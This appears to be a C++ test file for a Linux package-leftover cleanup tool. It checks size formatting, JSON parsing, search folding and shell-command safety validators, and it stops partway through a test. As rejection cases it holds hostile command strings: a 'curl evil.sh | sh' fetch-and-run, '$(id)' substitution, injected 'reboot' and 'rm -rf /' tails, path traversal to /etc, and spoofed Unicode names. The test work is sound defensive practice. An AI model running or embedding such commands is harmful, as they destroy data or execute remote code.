// Helper coverage for finding.cpp and diskusage.cpp. These tests need no scan
// and no wasm host, so they run in their own binary instead of inside the
// shipped Qt app (scripts/linux-qt-link.sh runs both).
#include "diskusage.h"
#include "finding.h"
#include "scanworker.h"
#include "scriptproc.h"
#include "settings.h"

#include <QAtomicInt>
#include <QCoreApplication>
#include <QDate>
#include <QDateTime>
#include <QDir>
#include <QEventLoop>
#include <QFile>
#include <QFileInfo>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QLocale>
#include <QSet>
#include <QSettings>
#include <QString>
#include <QStringList>
#include <QTemporaryDir>
#include <QTime>
#include <QTimeZone>
#include <QTimer>
#include <QVector>

#include <atomic>
#include <cstddef>
#include <cstdio>
#include <cstring>
#include <limits>
#include <thread>

static int verifyHelpers() {
    // Sizes and counts print the locale's separators and digits, so the
    // expected strings are built the same way instead of hardcoding "." and
    // ASCII digits.
    const QString dot = QString(QLocale().decimalPoint());
    if (humanSize(0) != localeCount(0) + QLatin1String(" B")) {
        std::fprintf(stderr, "humanSize(0) mismatch\n");
        return 1;
    }
    if (humanSize(1024) != QStringLiteral("1") + dot + QLatin1String("0 KB")) {
        std::fprintf(stderr, "humanSize(1024) mismatch\n");
        return 1;
    }
    if (humanSize(1048525) != QStringLiteral("1") + dot + QLatin1String("0 MB")) {
        std::fprintf(stderr, "humanSize(1048525) should bump 1024.0 KB to 1.0 MB\n");
        return 1;
    }
    if (humanSize(1023 * 1024) != QStringLiteral("1023") + dot + QLatin1String("0 KB")) {
        std::fprintf(stderr, "humanSize(1023 KiB) mismatch\n");
        return 1;
    }
    if (humanSize(std::numeric_limits<qint64>::max())
        != QStringLiteral("8") + dot + QLatin1String("0 EB")) {
        std::fprintf(stderr, "humanSize(qint64 max) should read as 8.0 EB, not 8192.0 PB\n");
        return 1;
    }
    // Whole bytes keep the locale's grouping, so 1023 reads "1.023 B" in
    // German rather than the C locale's "1023 B". 1023 is the largest count
    // that stays in the byte unit, and the one a single-file leftover hits.
    if (humanSize(1023) != localeCount(1023) + QLatin1String(" B")) {
        std::fprintf(stderr, "humanSize(1023) lost the locale grouping\n");
        return 1;
    }
    // A volume row's three columns have to add up. `bytesFree` counts the
    // blocks ext4 reserves for root and `bytesAvailable` does not, so using
    // the larger one for "used" makes a 100 GB volume with 5 GB reserved read
    // 51 GB used beside 44 GB available.
    if (volumeUsedBytes(Q_INT64_C(107374182400), Q_INT64_C(48234418176)) != Q_INT64_C(59139764224)) {
        std::fprintf(stderr, "volumeUsedBytes should subtract available, not free\n");
        return 1;
    }
    if (volumeUsedBytes(Q_INT64_C(107374182400), Q_INT64_C(107374182400)) != 0) {
        std::fprintf(stderr, "an empty volume has nothing used\n");
        return 1;
    }
    if (volumeUsedBytes(Q_INT64_C(107374182400), -1) != Q_INT64_C(107374182400)) {
        std::fprintf(stderr, "a volume that reports no free space is all used\n");
        return 1;
    }
    if (volumeUsedBytes(0, 0) != 0) {
        std::fprintf(stderr, "a volume of unknown size has nothing used\n");
        return 1;
    }
    // Byte totals saturate. The walk saturates each node, so one node can
    // already hold qint64 max and a plain `+=` of a second one is signed
    // overflow: a negative total, which then prints as a negative size and
    // scales a treemap by a negative area.
    if (addSatBytes(Q_INT64_C(1), Q_INT64_C(2)) != Q_INT64_C(3)) {
        std::fprintf(stderr, "addSatBytes should add a measured size\n");
        return 1;
    }
    if (addSatBytes(std::numeric_limits<qint64>::max(), Q_INT64_C(1))
        != std::numeric_limits<qint64>::max()) {
        std::fprintf(stderr, "addSatBytes should saturate instead of overflowing\n");
        return 1;
    }
    if (addSatBytes(Q_INT64_C(10), std::numeric_limits<qint64>::max())
        != std::numeric_limits<qint64>::max()) {
        std::fprintf(stderr, "addSatBytes should saturate from either side\n");
        return 1;
    }
    // -1 is how this host spells "not measured", not an amount, so it is
    // skipped rather than subtracting from the total, and a negative running
    // total restarts at zero when a measured size arrives.
    if (addSatBytes(Q_INT64_C(5), -1) != Q_INT64_C(5)) {
        std::fprintf(stderr, "an unmeasured size should not subtract\n");
        return 1;
    }
    if (addSatBytes(-1, Q_INT64_C(7)) != Q_INT64_C(7)) {
        std::fprintf(stderr, "a measured size should replace an unmeasured total\n");
        return 1;
    }
    QVector<Finding> largeSize;
    appendFindingsFromBlob(largeSize, QByteArrayLiteral(
        "{\"findings\":[{\"name\":\"large\",\"size_bytes\":9007199254740993}]}"));
    if (largeSize.size() != 1 || largeSize[0].bytes != Q_INT64_C(9007199254740993)) {
        std::fprintf(stderr, "64-bit JSON integer lost precision\n");
        return 1;
    }
    QVector<Finding> invalidSize;
    appendFindingsFromBlob(invalidSize, QByteArrayLiteral(
        "{\"findings\":[{\"name\":\"invalid\",\"size_bytes\":\"not-a-number\"}]}"));
    if (invalidSize.size() != 1 || invalidSize[0].bytes != -1) {
        std::fprintf(stderr, "invalid JSON integer treated as zero\n");
        return 1;
    }
    if (!isProtectedPackagedPath(QStringLiteral("/usr/bin/python3"))) {
        std::fprintf(stderr, "isProtectedPackagedPath missed /usr\n");
        return 1;
    }
    if (isProtectedPackagedPath(QStringLiteral("/home/u/gone-app"))) {
        std::fprintf(stderr, "isProtectedPackagedPath over-matched a home path\n");
        return 1;
    }
    /* rm resolves `..`, so a path that walks out of the tree the prefix test
       approved deletes a packaged root. */
    if (!isProtectedPackagedPath(QStringLiteral("/home/u/gone/../../../etc"))) {
        std::fprintf(stderr, "isProtectedPackagedPath accepted a parent traversal\n");
        return 1;
    }
    {
        Finding trav;
        trav.status = QStringLiteral("orphaned");
        trav.kind = QStringLiteral("config");
        trav.plugin = QStringLiteral("path-home-dot");
        trav.path = QStringLiteral("/home/u/gone/../../../etc");
        if (leftoverCleanupCommand(trav).contains(QLatin1String("rm "))) {
            std::fprintf(stderr, "leftoverCleanupCommand removed a parent traversal\n");
            return 1;
        }
    }
    {
        Finding ppa;
        ppa.status = QStringLiteral("orphaned");
        ppa.kind = QStringLiteral("ppa");
        ppa.plugin = QStringLiteral("apt");
        ppa.path = QStringLiteral("/etc/apt/sources.list.d/vendor.list");
        ppa.extraPaths = QStringList{QStringLiteral("/etc/apt/sources.list.d/../sources.list.d/evil.list")};
        const QString cmd = leftoverCleanupCommand(ppa);
        if (!cmd.contains(QLatin1String("vendor.list"))) {
            std::fprintf(stderr, "leftoverCleanupCommand dropped the ppa row\n");
            return 1;
        }
        if (cmd.contains(QLatin1String("evil.list"))) {
            std::fprintf(stderr, "leftoverCleanupCommand kept a ppa parent traversal\n");
            return 1;
        }
    }

    Finding f;
    f.path = QString::fromUtf8("/tmp/Cafe\xCC\x81");
    QSet<QString> ignored;
    ignored.insert(pathIdentityKey(QString::fromUtf8("/tmp/Caf\xC3\xA9")));
    if (!leftoverIsIgnored(f, ignored)) {
        std::fprintf(stderr, "leftoverIsIgnored NFC/NFD mismatch\n");
        return 1;
    }
    // A decomposed path off an exFAT/NTFS share must still match a
    // precomposed query typed into the search box.
    Finding searched;
    searched.name = QString::fromUtf8("Cafe\xCC\x81 Player");
    if (!searchHaystack(searched).contains(searchFold(QString::fromUtf8("caf\xC3\xA9")))) {
        std::fprintf(stderr, "searchHaystack misses an NFD name for an NFC query\n");
        return 1;
    }
    if (searchHaystack(searched).contains(searchFold(QStringLiteral("cafe")))) {
        std::fprintf(stderr, "searchHaystack folded a diacritic away\n");
        return 1;
    }
    if (searchFold(QStringLiteral("IINA")) != QLatin1String("iina")) {
        std::fprintf(stderr, "searchFold did not lowercase ASCII\n");
        return 1;
    }
    // Case folding, not lowercasing: the final sigma lowercases to itself, so a
    // name spelled with ς at the end of a word ("ὀδυσσεύς") was invisible to a
    // search for the same word spelled with the medial sigma.
    if (searchFold(QString::fromUtf8("\xCF\x82"))
        != searchFold(QString::fromUtf8("\xCF\x83"))) {
        std::fprintf(stderr, "searchFold did not case-fold the final sigma\n");
        return 1;
    }
    // A name off the filesystem is not markup, and a tooltip is drawn as rich
    // text, so the tag has to survive as text.
    if (plainTooltip(QStringLiteral("<b>Firefox</b>")).contains(QLatin1String("<b>"))) {
        std::fprintf(stderr, "plainTooltip left a tag unescaped\n");
        return 1;
    }
    if (scriptHasCommands(QStringLiteral("#!/bin/sh\nset -e\n# comment\n"))) {
        std::fprintf(stderr, "scriptHasCommands preamble-only should be empty\n");
        return 1;
    }
    if (!scriptHasCommands(QStringLiteral("#!/bin/sh\nset -e\nrm -rf /tmp/x\n"))) {
        std::fprintf(stderr, "scriptHasCommands missed rm\n");
        return 1;
    }
    if (!commandIsShellSafe(QStringLiteral("apt-get purge -y wget"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a plain command\n");
        return 1;
    }
    if (!commandIsShellSafe(QStringLiteral("rm -rf '/home/user/App Support/x'"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a quoted path with a space\n");
        return 1;
    }
    if (!commandIsShellSafe(QStringLiteral("rm -f '/home/user/o'\\''brien'"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected an embedded quote\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral("npm -g uninstall x; reboot #"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected command\n");
        return 1;
    }
    if (!commandIsShellSafe(QStringLiteral("rm -rf 'x'\\''; reboot; '\\'''"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a shellQuote-escaped name\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral("rm -rf /tmp/x\ncurl evil.sh | sh"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted a newline and a pipe\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral("rm -rf $(id)"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted a command substitution\n");
        return 1;
    }
    if (commandIsShellSafe(QString())) {
        std::fprintf(stderr, "commandIsShellSafe accepted an empty command\n");
        return 1;
    }
    // A guarded removal is the app's own structure; both halves still have to
    // pass the byte check, or a second run would abort the script.
    if (!commandIsShellSafe(QStringLiteral(
            "if apt-get --version >/dev/null 2>&1; then apt-get purge -y wget; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a guarded removal\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if test -e /tmp/x >/dev/null 2>&1; then rm -rf /tmp/x; reboot; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected action in a guard\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if test -e /tmp/x; reboot >/dev/null 2>&1; then rm -rf /tmp/x; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected query in a guard\n");
        return 1;
    }
    // The action is judged between `; then` and the last `; fi`, so a tail
    // after that `; fi` is not part of either half and would run unjudged.
    if (commandIsShellSafe(QStringLiteral(
            "if test -e /tmp/x >/dev/null 2>&1; then rm -rf /tmp/x; fi; reboot"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted a command after the guard\n");
        return 1;
    }
    if (parseGuardedRemove(
            QStringLiteral("if test -e /tmp/x >/dev/null 2>&1; then rm -rf /tmp/x; fi; reboot"))) {
        std::fprintf(stderr, "parseGuardedRemove took a line with a tail for a guard\n");
        return 1;
    }
    if (!parseGuardedRemove(QStringLiteral(
            "if test -e /tmp/x >/dev/null 2>&1; then rm -rf /tmp/x; fi"))) {
        std::fprintf(stderr, "parseGuardedRemove rejected a plain guard\n");
        return 1;
    }
    // The row guard filters a listing inside the guard, so npm, pnpm, bun,
    // pipx and uv removals reach the script in this shape.
    if (!commandIsShellSafe(QStringLiteral(
            "if npm ls -g --depth=0 | grep -qF -- 'left-pad@1.3.0'; then "
            "npm uninstall -g left-pad; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a row guard\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if npm ls -g | grep -qF -- 'x'; then npm uninstall -g x; reboot; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected action in a row guard\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if npm ls -g | grep -qF -- 'x' ; reboot; then npm uninstall -g x; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected query in a row guard\n");
        return 1;
    }
    // The pacman-family upgrade is guarded on the manager's own update query,
    // so a script that runs twice does not reinstall. Same wrapper shape as a
    // guarded removal, so it has to be accepted the same way.
    if (!commandIsShellSafe(QStringLiteral(
            "if pacman -Qu vim >/dev/null 2>&1; then pacman --noconfirm -S vim; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a guarded upgrade\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if pacman -Qu vim >/dev/null 2>&1; then pacman --noconfirm -S vim; reboot; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected action in an upgrade guard\n");
        return 1;
    }
    if (!commandNeedsRoot(QStringLiteral(
            "if pacman -Qu vim >/dev/null 2>&1; then pacman --noconfirm -S vim; fi"))) {
        std::fprintf(stderr, "commandNeedsRoot lost the action inside an upgrade guard\n");
        return 1;
    }
    if (!QFile::exists(QStringLiteral(":/icons/appattic.png"))) {
        std::fprintf(stderr, "icon: embedded :/icons/appattic.png missing\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("pacman")) != QLatin1String("Checking pacman packages")) {
        std::fprintf(stderr, "pluginScanLabel: pacman\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("aur")) != QLatin1String("Checking AUR packages")) {
        std::fprintf(stderr, "pluginScanLabel: aur\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("leftover-sizes"))
        != QLatin1String("Measuring leftover sizes")) {
        std::fprintf(stderr, "pluginScanLabel: leftover-sizes\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("path_home_dot"))
        != QLatin1String("Scanning leftover data in the home folder")) {
        std::fprintf(stderr, "pluginScanLabel: path_home_dot underscore\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("path-shadow")) != QLatin1String("Scanning PATH overlays")) {
        std::fprintf(stderr, "pluginScanLabel: path-shadow\n");
        return 1;
    }
    if (!pluginScanLabel(QStringLiteral("container-runtime")).contains(QLatin1String("container"))) {
        std::fprintf(stderr, "pluginScanLabel: container-runtime\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("deno")) != QLatin1String("Checking Deno global installs")) {
        std::fprintf(stderr, "pluginScanLabel: deno\n");
        return 1;
    }

    if (!outdatedIsUpdatable(QStringLiteral("apt"), QString())
        || !outdatedIsUpdatable(QStringLiteral("pacman"), QString())
        || !outdatedIsUpdatable(QStringLiteral("aur"), QString())
        || !outdatedIsUpdatable(QStringLiteral("dnf"), QString())
        || !outdatedIsUpdatable(QStringLiteral("yum"), QString())
        || !outdatedIsUpdatable(QStringLiteral("zypper"), QString())) {
        std::fprintf(stderr, "outdatedIsUpdatable: named distro upgrades must be updatable\n");
        return 1;
    }
    if (outdatedIsUpdatable(QStringLiteral("pip"), QString())
        || outdatedIsUpdatable(QStringLiteral("snapd"), QString())
        || outdatedIsUpdatable(QStringLiteral("brew-cask"), QStringLiteral("untrusted"))) {
        std::fprintf(stderr, "outdatedIsUpdatable: report-only manager or untrusted cask\n");
        return 1;
    }
    if (outdatedIsUpdatable(QStringLiteral("flatpak"), QStringLiteral("unused-runtime"))
        || outdatedIsUpdatable(QStringLiteral("flatpak"), QStringLiteral("orphan"))) {
        std::fprintf(stderr,
            "outdatedIsUpdatable: non-outdated kind must not inherit an update action\n");
        return 1;
    }
    if (!outdatedIsUpdatable(QStringLiteral("brew-formula"), QString())
        || !outdatedIsUpdatable(QStringLiteral("brew-cask"), QString())
        || !outdatedIsUpdatable(QStringLiteral("flatpak"), QString())
        || !outdatedIsUpdatable(QStringLiteral("flatpak"), QStringLiteral("outdated"))) {
        std::fprintf(stderr, "outdatedIsUpdatable: brew/flatpak must be updatable\n");
        return 1;
    }

    QVector<Finding> rows;
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"apt\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"git\",\"name\":\"git\","
        "\"current_version\":\"1.0\",\"latest_version\":\"2.0\","
        "\"status\":\"outdated\",\"updatable\":false,"
        "\"command\":\"apt install --only-upgrade git\",\"manager\":\"apt\"}]}"));
    if (rows.size() != 1 || !isOutdated(rows[0]) || rows[0].updatable
        || canMarkCleanup(rows[0], Page::Outdated)) {
        std::fprintf(stderr, "updatable: apt status=outdated must not override updatable:false\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"brew\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"wget\",\"name\":\"wget\","
        "\"status\":\"outdated\",\"updatable\":true,"
        "\"command\":\"brew upgrade wget\",\"manager\":\"brew-formula\"}]}"));
    if (rows.size() != 1 || !rows[0].updatable || !canMarkCleanup(rows[0], Page::Outdated)) {
        std::fprintf(stderr, "updatable: brew-formula with updatable:true\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"brew\",\"findings\":[{"
        "\"kind\":\"untrusted\",\"id\":\"sketchy\",\"name\":\"sketchy\","
        "\"status\":\"outdated\",\"updatable\":true,\"manager\":\"brew-cask\"}]}"));
    if (rows.size() != 1 || rows[0].updatable || canMarkCleanup(rows[0], Page::Outdated)) {
        std::fprintf(stderr, "updatable: untrusted must win over updatable:true\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"apt\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"git\",\"name\":\"git\","
        "\"status\":\"outdated\",\"updatable\":true,"
        "\"command\":\"apt install --only-upgrade git\",\"manager\":\"apt\"}]}"));
    if (rows.size() != 1 || !rows[0].updatable
        || rows[0].updateCommand != QLatin1String("apt install --only-upgrade git")
        || !canMarkCleanup(rows[0], Page::Outdated)) {
        std::fprintf(stderr, "updatable: apt command must become the update action\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"pacman\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"vim\",\"name\":\"vim\","
        "\"status\":\"outdated\",\"manager\":\"pacman\"}]}"));
    if (rows.size() != 1 || !rows[0].updatable) {
        std::fprintf(stderr, "updatable: omitted updatable should follow manager pacman\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"brew\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"cask\",\"name\":\"cask\","
        "\"status\":\"outdated\",\"manager\":\"brew-cask\"}]}"));
    if (rows.size() != 1 || !rows[0].updatable) {
        std::fprintf(stderr, "updatable: omitted updatable should follow manager brew-cask\n");
        return 1;
    }

    // A plugin note is the only signal that a row's list is short of the
    // machine: a command that did not answer, or more rows than the plugin's
    // table holds. A per-row reason must not bury it, because the user
    // confirms a deletion from this list.
    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"apt\",\"note\":\"1 list hit the row limit: more rows exist than were shown\","
        "\"dialog\":{\"title\":\"Remove apt orphans?\",\"body\":\"Named autoremove leaves only.\"},"
        "\"findings\":[{\"kind\":\"orphan\",\"id\":\"libfoo\",\"name\":\"libfoo\","
        "\"status\":\"orphaned\",\"manager\":\"apt\","
        "\"reason\":\"nothing needs it any more\"}]}"));
    if (rows.size() != 1
        || !rows[0].dialogBody.contains(QLatin1String("hit the row limit"))) {
        std::fprintf(stderr, "note: a truncated list must reach the row despite its reason\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"apt\",\"dialog\":{\"title\":\"t\",\"body\":\"Named autoremove leaves only.\"},"
        "\"findings\":[{\"kind\":\"orphan\",\"id\":\"libfoo\",\"name\":\"libfoo\","
        "\"status\":\"orphaned\",\"manager\":\"apt\"}]}"));
    if (rows.size() != 1
        || rows[0].dialogBody.contains(QLatin1String("Scan incomplete"))) {
        std::fprintf(stderr, "note: a complete scan must not claim to be incomplete\n");
        return 1;
    }

    Finding leftover;
    leftover.plugin = QStringLiteral("path-home-dot");
    leftover.status = QStringLiteral("orphaned");
    leftover.kind = QStringLiteral("dir");
    leftover.path = QStringLiteral("/home/alice/.config/gone-app");
    leftover.extraPaths << QStringLiteral("/home/alice/.local/share/gone-app")
                        << QStringLiteral("/usr/share/gone-app");
    const QString rm = leftoverCleanupCommand(leftover);
    if (!rm.contains(QLatin1String("rm -rf ")) || !rm.contains(QLatin1Char('\''))
        || rm.contains(QLatin1String("rm -rf /home/alice"))
        || !rm.contains(QLatin1String("'/home/alice/.local/share/gone-app'"))
        || rm.contains(QLatin1String("/usr/share"))) {
        std::fprintf(stderr, "leftoverCleanupCommand: path leftover must be quoted rm -rf including extraPaths\n");
        return 1;
    }
    if (!canMarkCleanup(leftover, Page::Leftovers)) {
        std::fprintf(stderr, "canMarkCleanup: leftover row must be markable for the list tickbox\n");
        return 1;
    }
    // A name from a registry, a tap, or the scan cache: a leading `-` reaches
    // the manager as an option, so mark-manual has to refuse it rather than
    // quote it into a different command.
    Finding option;
    option.manager = QStringLiteral("apt");
    option.kind = QStringLiteral("orphan");
    option.name = QStringLiteral("--set-priority=install");
    if (!markManualCommand(option).isEmpty()) {
        std::fprintf(stderr, "markManualCommand: a leading dash must be refused\n");
        return 1;
    }
    Finding named;
    named.manager = QStringLiteral("apt");
    named.kind = QStringLiteral("orphan");
    named.name = QStringLiteral("libfoo");
    // Guarded like a removal, and for the same reason: a re-run of a kept
    // script reaches a mark-manual line for a package an earlier run purged,
    // and `apt-mark` cannot find a package dpkg does not know, so a bare call
    // exits nonzero and `set -e` strands every line below it.
    const QString mark = markManualCommand(named);
    if (mark != QStringLiteral("if dpkg -s 'libfoo' >/dev/null 2>&1; then apt-mark manual 'libfoo'; fi")) {
        std::fprintf(stderr, "markManualCommand: a real name must be scripted inside the presence guard\n");
        return 1;
    }
    if (!parseGuardedRemove(mark).has_value()) {
        std::fprintf(stderr, "markManualCommand: the line must read back as a guarded line\n");
        return 1;
    }
    {
        Finding arch;
        arch.manager = QStringLiteral("pacman");
        arch.kind = QStringLiteral("orphan");
        arch.name = QStringLiteral("libfoo");
        if (markManualCommand(arch)
            != QStringLiteral("if pacman -Qq 'libfoo' >/dev/null 2>&1; then pacman -D --asexplicit 'libfoo'; fi")) {
            std::fprintf(stderr, "markManualCommand: pacman must ask pacman itself whether the package is there\n");
            return 1;
        }
        Finding rpm;
        rpm.manager = QStringLiteral("dnf");
        rpm.kind = QStringLiteral("orphan");
        rpm.name = QStringLiteral("libfoo");
        if (markManualCommand(rpm)
            != QStringLiteral("if rpm -q 'libfoo' >/dev/null 2>&1; then dnf mark install 'libfoo'; fi")) {
            std::fprintf(stderr, "markManualCommand: dnf must ask rpm whether the package is there\n");
            return 1;
        }
    }
    // The guard is a read and stays unprivileged; only the action escalates,
    // the same way a guarded removal does. `rootcmd if q; then a; fi` is a
    // syntax error that takes the whole script down, so the judgment is made
    // on the action and the wrapper goes inside the guard.
    if (!commandNeedsRoot(mark)) {
        std::fprintf(stderr, "markManualCommand: the action reaches the user through rootcmd\n");
        return 1;
    }
    const QString escalated = withRootCmd(mark);
    if (escalated != QStringLiteral("if dpkg -s 'libfoo' >/dev/null 2>&1; then rootcmd apt-mark manual 'libfoo'; fi")) {
        std::fprintf(stderr, "markManualCommand: the action escalates inside the guard, not around it\n");
        return 1;
    }
    // Wrapping again must not escalate twice.
    if (withRootCmd(escalated) != escalated) {
        std::fprintf(stderr, "markManualCommand: an escalated line must not escalate twice\n");
        return 1;
    }
    Finding ppa;
    ppa.kind = QStringLiteral("ppa");
    ppa.status = QStringLiteral("review");
    ppa.path = QStringLiteral("/etc/apt/sources.list.d/deadsnakes-ubuntu-ppa-noble.list");
    const QString ppaRm = leftoverCleanupCommand(ppa);
    if (!ppaRm.contains(QLatin1String("rm -f "))
        || !ppaRm.contains(QLatin1String("'/etc/apt/sources.list.d/deadsnakes-ubuntu-ppa-noble.list'"))
        || !commandNeedsRoot(ppaRm)
        || !withRootCmd(ppaRm).startsWith(QLatin1String("rootcmd "))) {
        std::fprintf(stderr, "leftoverCleanupCommand: PPA source must be quoted rm -f after confirm\n");
        return 1;
    }
    if (!commandNeedsRoot(QStringLiteral("apt-get -y install --only-upgrade git"))
        || !commandNeedsRoot(QStringLiteral("pacman --noconfirm -S vim"))
        || !commandNeedsRoot(QStringLiteral("paru --noconfirm -S vim"))
        || !commandNeedsRoot(QStringLiteral("yay --noconfirm -S vim"))
        || !commandNeedsRoot(QStringLiteral("snap remove hello"))
        || commandNeedsRoot(QStringLiteral("rm -rf '/home/alice/.config/gone-app'"))
        || commandNeedsRoot(QStringLiteral("pip uninstall -y --user httpie"))
        || commandNeedsRoot(QStringLiteral("rm -rf '/home/alice/etc/apt/sources.list.d/x.list'"))) {
        std::fprintf(stderr, "commandNeedsRoot: distro/AUR/snap yes, user leftover/pip no\n");
        return 1;
    }
    // A guarded removal is judged on its action, not on the leading `if`, and
    // the escalation goes inside the guard: `rootcmd if ...; then ...; fi`
    // stops parsing.
    const QString snapGuarded =
        QStringLiteral("if snap list hello >/dev/null 2>&1; then snap remove hello; fi");
    if (!commandNeedsRoot(snapGuarded)
        || withRootCmd(snapGuarded)
               != QStringLiteral("if snap list hello >/dev/null 2>&1; then rootcmd snap remove hello; fi")
        || commandNeedsRoot(withRootCmd(snapGuarded))
        || commandNeedsRoot(QStringLiteral("if flatpak info org.mozilla.Firefox >/dev/null 2>&1; then flatpak uninstall -y org.mozilla.Firefox; fi"))) {
        std::fprintf(stderr, "commandNeedsRoot: guarded removal judged on its action\n");
        return 1;
    }
    // A comment names a path the way a command does and runs nothing.
    if (commandNeedsRoot(QStringLiteral("# skipped packaged path '/etc/apt/sources.list.d/x.list'"))
        || !withRootCmd(QStringLiteral("# skipped packaged path '/etc/apt/sources.list.d/x.list'"))
                .startsWith(QLatin1Char('#'))) {
        std::fprintf(stderr, "commandNeedsRoot: a comment line never escalates\n");
        return 1;
    }
    Finding keepRm;
    keepRm.plugin = QStringLiteral("path-xdg-config");
    keepRm.kind = QStringLiteral("orphan-dir");
    keepRm.status = QStringLiteral("keep");
    keepRm.path = QStringLiteral("/home/alice/.mozilla");
    if (!leftoverCleanupCommand(keepRm).isEmpty()) {
        std::fprintf(stderr, "leftoverCleanupCommand: keep leftover must not emit rm\n");
        return 1;
    }
    Finding infixPpa;
    infixPpa.plugin = QStringLiteral("path-xdg-config");
    infixPpa.kind = QStringLiteral("orphan-dir");
    infixPpa.status = QStringLiteral("orphaned");
    infixPpa.path = QStringLiteral("/etc/foo/etc/apt/sources.list.d/x.list");
    if (!leftoverCleanupCommand(infixPpa).isEmpty()) {
        std::fprintf(stderr, "leftoverCleanupCommand: infix sources.list.d is not a PPA file\n");
        return 1;
    }
    Finding pkg;
    pkg.kind = QStringLiteral("orphan");
    pkg.name = QStringLiteral("libfoo0");
    pkg.command = QStringLiteral("apt-get purge -y libfoo0");
    pkg.children << QStringLiteral("libbar1");
    const QString childCmd = packageChildCommand(pkg, QStringLiteral("libbar1"));
    if (childCmd != QLatin1String("apt-get purge -y 'libbar1'")) {
        std::fprintf(stderr, "packageChildCommand: expected quoted child target (%s)\n",
            childCmd.toUtf8().constData());
        return 1;
    }
    if (!packageChildCommand(pkg, QStringLiteral("libbar1; rm -rf /")).isEmpty()) {
        std::fprintf(stderr, "packageChildCommand: metacharacters in child name\n");
        return 1;
    }
    // A child name is identity-bearing: the row is shown, ticked, and turned
    // into the script's `apt-get purge -y '<child>'` by this function. U+202E
    // reverses the rest of the name on screen, and the zero-width ranges drop
    // letters without changing the length, so the name beside the checkbox and
    // the name the script removes can differ. The plugin refuses these at the
    // source; this is the second gate, and it matches Zig `isSafeCmdIdent`.
    for (const QString &spoofed : {
             QString::fromUtf8("libfoo\xE2\x80\xAE" "dwp"),  // U+202E RLO
             QString::fromUtf8("lib\xE2\x80\x8B" "foo"),    // U+200B ZWSP
             QString::fromUtf8("caf\xC3\xA9"),                // accented letter
         }) {
        if (!packageChildCommand(pkg, spoofed).isEmpty()) {
            std::fprintf(stderr, "packageChildCommand: accepted a spoofed child name\n");
            return 1;
        }
    }
    QVector<Finding> grouped;
    Finding a;
    a.plugin = QStringLiteral("path-xdg-config");
    a.kind = QStringLiteral("orphan-dir");
    a.status = QStringLiteral("orphaned");
    a.name = QStringLiteral("gone-app");
    // Siblings under one parent: a merge is only a merge when the two rows
    // name directories the review can show together.
    a.path = QStringLiteral("/home/alice/.config/gone-app");
    a.bytes = 10;
    Finding b;
    b.plugin = QStringLiteral("path-xdg-cache");
    b.kind = QStringLiteral("orphan-dir");
    b.status = QStringLiteral("orphaned");
    b.name = QStringLiteral("gone-app");
    b.path = QStringLiteral("/home/alice/.config/gone-app.d");
    b.bytes = 20;
    grouped << a << b;
    groupLinuxLeftovers(grouped);
    if (grouped.size() != 1 || grouped[0].extraPaths.size() != 1
        || grouped[0].bytes != 30) {
        std::fprintf(stderr, "groupLinuxLeftovers: same-name leftovers must merge extraPaths\n");
        return 1;
    }
    // The same name in two different parents stays two rows. A merged row emits
    // one `rm -rf` over every path it collected, so a row that spanned
    // `~/.config/foo` and `~/.local/share/foo` would delete a directory the
    // review never showed as a leftover of the row the user ticked.
    QVector<Finding> crossDir;
    Finding cdA;
    cdA.plugin = QStringLiteral("path-xdg-config");
    cdA.kind = QStringLiteral("orphan-dir");
    cdA.status = QStringLiteral("orphaned");
    cdA.name = QStringLiteral("gone-app");
    cdA.path = QStringLiteral("/home/alice/.config/gone-app");
    cdA.bytes = 10;
    Finding cdB = cdA;
